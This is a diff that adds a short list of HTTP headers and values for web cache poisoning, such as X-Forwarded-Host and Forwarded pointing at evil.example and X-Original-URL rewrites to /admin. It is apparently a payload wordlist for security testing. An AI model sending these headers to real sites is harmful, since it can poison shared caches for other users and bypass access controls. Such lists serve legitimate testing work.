@@ -1,0 +1,16 @@
+# Web cache poisoning advanced headers/values
+X-Forwarded-Host: evil.example
+X-Host: evil.example
+X-Forwarded-Scheme: http
+X-Forwarded-Proto: http
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-Prefix: /evil
+X-Accel-Redirect: /admin
+Forwarded: host=evil.example;proto=http
+Host: evil.example
+X-HTTP-Method-Override: GET
+X-Method-Override: GET
+X-Original-Host: evil.example
+X-Cache-Key: evil
+X-Request-ID: poisoned
